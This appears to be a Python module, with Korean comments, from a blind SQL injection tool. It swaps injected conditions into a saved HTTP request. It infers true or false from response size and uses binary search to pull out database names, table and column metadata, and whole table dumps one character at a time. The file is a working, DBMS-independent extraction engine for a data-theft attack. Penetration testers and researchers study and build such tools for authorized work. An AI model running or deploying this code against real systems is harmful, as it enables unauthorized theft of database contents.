"""DBMS와 독립적인 실행 흐름. 네트워크 오류는 거짓 결과로 간주하지 않는다."""

from .dbms import Dialect


class ExecutionError(ValueError):
    pass


def bounded_integer(predicate, maximum):
    """predicate(n)이 value > n일 때 [0, maximum]의 정수를 반환한다."""
    if predicate(maximum):
        raise ExecutionError(f"설정한 상한 {maximum}을 초과했습니다. 상한 설정을 확인하세요.")
    low, high = 0, maximum
    while low < high:
        middle = (low + high) // 2
        if predicate(middle):
            low = middle + 1
        else:
            high = middle
    return low


class Injector:
    def __init__(self, args, client):
        self.args = args
        self.client = client
        self.dialect = Dialect(args.dbms)
        self.baseline = None

    def check(self, predicate):
        condition = self.client.request.condition.replace("1=2", predicate)
        return self.client.size(condition) - self.baseline > self.args.threshold

    def number(self, expression, maximum):
        return bounded_integer(lambda middle: self.check(f"({expression})>{middle}"), maximum)

    def text(self, expression):
        length = self.number(self.dialect.length(expression), self.args.max_len)
        characters = []
        for position in range(1, length + 1):
            code = self.number(self.dialect.character(expression, position), 127)
            characters.append(chr(code))
        return "".join(characters)

    def execute(self):
        self.baseline = self.client.size(self.client.request.condition)
        if not self.check("1=1"):
            raise ExecutionError(
                "참·거짓 응답을 구분할 수 없습니다. 요청 파일과 응답 크기 기준을 확인하세요."
            )
        if self.args.basic:
            return {query.label: self.text(query.item(0)) for query in self.dialect.basic()}
        if self.args.dump:
            table = self.args.select_table[0]
            queries = self.dialect.dump(
                self.args.select_db, table, self.args.select_column, self.args.order_by
            )
            count = self.number(queries[0].count, self.args.max_rows)
            return {
                table: [
                    {query.label: self.text(query.item(index)) for query in queries}
                    for index in range(count)
                ]
            }
        tables = self.args.select_table if self.args.columns else [None]
        results = {}
        for table in tables:
            query = self.dialect.metadata(
                self.args.mode, self.args.select_db, table, self.args.db_schema
            )
            count = self.number(query.count, self.args.max_rows)
            values = []
            for index in range(count):
                value = self.text(query.item(index))
                values.append(value)
                print(f"[{index + 1}/{count}] {value}")
            results[table if self.args.columns else self.args.mode] = values
        return results
